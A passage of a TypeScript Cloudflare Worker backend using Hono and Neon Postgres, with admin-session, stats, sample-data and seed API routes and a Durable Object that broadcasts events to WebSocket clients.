    `INSERT INTO admin_sessions (id, user_agent, ip, device) VALUES ($1, $2, $3, $4)`,
    [id, ua, ip, parseDevice(ua)],
  );
  return c.json({ sessionId: id });
});
app.patch("/api/admin/sessions/:id/ping", async (c) => {
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  await sqlClient(`UPDATE admin_sessions SET last_active = NOW() WHERE id = $1`, [c.req.param("id")]);
  return c.json({ ok: true });
});
app.delete("/api/admin/sessions/:id", async (c) => {
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  await sqlClient(`DELETE FROM admin_sessions WHERE id = $1`, [c.req.param("id")]);
  return c.json({ ok: true });
});
app.delete("/api/admin/sessions", async (c) => {
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  await sqlClient(`DELETE FROM admin_sessions`);
  return c.json({ ok: true });
});

// ------- STATS / SAMPLE / SEED -------
app.get("/api/stats", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  if (appId) {
    const [d] = await db.select({ c: sql<string>`count(*)::text` }).from(devices).where(eq(devices.appId, appId));
    const [m] = await db.select({ c: sql<string>`count(*)::text` }).from(messages).where(eq(messages.appId, appId));
    const [f] = await db.select({ c: sql<string>`count(*)::text` }).from(formData).where(eq(formData.appId, appId));
    return c.json({ devices: Number(d.c), messages: Number(m.c), formData: Number(f.c) });
  }
  const [a] = await db.select({ c: sql<string>`count(*)::text` }).from(apps);
  const [d] = await db.select({ c: sql<string>`count(*)::text` }).from(devices);
  const [m] = await db.select({ c: sql<string>`count(*)::text` }).from(messages);
  const [f] = await db.select({ c: sql<string>`count(*)::text` }).from(formData);
  return c.json({ apps: Number(a.c), devices: Number(d.c), messages: Number(m.c), formData: Number(f.c) });
});

app.get("/api/sample", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  if (appId) {
    const [d] = await db.select().from(devices).where(eq(devices.appId, appId)).limit(1);
    const [m] = await db.select().from(messages).where(eq(messages.appId, appId)).limit(1);
    const [f] = await db.select().from(formData).where(eq(formData.appId, appId)).limit(1);
    return c.json({
      devices: d ? mapDevice(d) : null,
      messages: m ? mapMessage(m) : null,
      formData: f ? mapFormData(f) : null,
    });
  }
  const [a] = await db.select().from(apps).limit(1);
  const [d] = await db.select().from(devices).limit(1);
  const [m] = await db.select().from(messages).limit(1);
  const [f] = await db.select().from(formData).limit(1);
  return c.json({
    apps: a ? mapApp(a) : null,
    devices: d ? mapDevice(d) : null,
    messages: m ? mapMessage(m) : null,
    formData: f ? mapFormData(f) : null,
  });
});

app.post("/api/seed", async (c) => {
  const db = getDb(c.env);
  const existing = await db.select().from(apps).where(eq(apps.appId, DEFAULT_APP_ID)).limit(1);
  if (existing.length === 0) {
    await db.insert(apps).values({
      appId: DEFAULT_APP_ID, name: DEFAULT_APP_NAME, pin: DEFAULT_APP_PIN, status: "active",
    }).onConflictDoNothing({ target: apps.appId });
  }
  return c.json({ ok: true, message: "Database is ready" });
});

// ------- EVENTS (WebSocket via Durable Object) -------
app.get("/api/events", async (c) => {
  const upgrade = c.req.header("Upgrade");
  if (upgrade !== "websocket") {
    return c.text("Expected websocket upgrade", 426);
  }
  const id = c.env.EVENT_BUS.idFromName("global");
  const stub = c.env.EVENT_BUS.get(id);
  return stub.fetch("https://do.local/ws", c.req.raw);
});

// =================== DURABLE OBJECT ===================
export class EventBus {
  state: DurableObjectState;
  constructor(state: DurableObjectState, _env: Env) {
    this.state = state;
  }

  async fetch(request: Request): Promise<Response> {
    const url = new URL(request.url);

    if (url.pathname === "/ws") {
      const upgrade = request.headers.get("Upgrade");
      if (upgrade !== "websocket") {
        return new Response("Expected websocket", { status: 426 });
      }
      const pair = new WebSocketPair();
      const [client, server] = [pair[0], pair[1]];
      this.state.acceptWebSocket(server);
      // initial ping payload so the client knows the channel is alive
      try { server.send(JSON.stringify({ event: "ping", data: { t: Date.now() } })); } catch {}
      return new Response(null, { status: 101, webSocket: client });
    }

    if (url.pathname === "/broadcast" && request.method === "POST") {
      const body = await request.json() as { event: string; data: unknown };
      const payload = JSON.stringify(body);
      const sockets = this.state.getWebSockets();
      for (const ws of sockets) {
        try { ws.send(payload); } catch {
          try { ws.close(1011, "send error"); } catch {}
        }
      }
      return new Response(JSON.stringify({ ok: true, clients: sockets.length }), {
        headers: { "content-type": "application/json" },
      });
    }

    return new Response("Not found", { status: 404 });
  }

  // Hibernation API callbacks — required so DO can sleep and reload sockets
  async webSocketMessage(_ws: WebSocket, _msg: string | ArrayBuffer): Promise<void> {
    // We don't need to handle inbound from client; just ignore.
  }
  async webSocketClose(ws: WebSocket, code: number, _reason: string, _wasClean: boolean): Promise<void> {
    try { ws.close(code, "closed"); } catch {}
  }
  async webSocketError(ws: WebSocket, _err: unknown): Promise<void> {
    try { ws.close(1011, "error"); } catch {}
  }
}

// =================== WORKER ENTRY ===================
export default {
  async fetch(request: Request, env: Env, ctx: ExecutionContext): Promise<Response> {
    const url = new URL(request.url);
    if (url.pathname.startsWith("/api/")) {
      return app.fetch(request, env, ctx);
    }
    // fall through to Pages static assets (React SPA)
    return env.ASSETS.fetch(request);
  },
};
